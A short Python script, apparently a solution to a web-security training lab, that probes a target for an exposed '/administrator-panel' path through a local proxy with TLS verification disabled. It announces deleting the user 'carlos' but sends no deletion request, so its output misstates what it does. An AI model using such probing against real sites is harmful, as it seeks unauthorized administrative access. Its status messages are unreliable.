#!/usr/bin/env python3
import sys
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(url):
    admin_panel_url=url + '/administrator-panel'
    r = requests.get(admin_panel_url,verify=False,proxies=proxies)
    if r.status_code==200:
        print('[+] Found admin panel!')
        print('[+] Deleteing carlos user')


def main():
    if len(sys.argv) !=2:
        print("[+] Usage %s <url>" % sys.argv[0])
        print("[+] example  %s www.xsisec.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("[+] Finding admin panel...")
    delete_user(url)


if __name__== "__main__":
    main()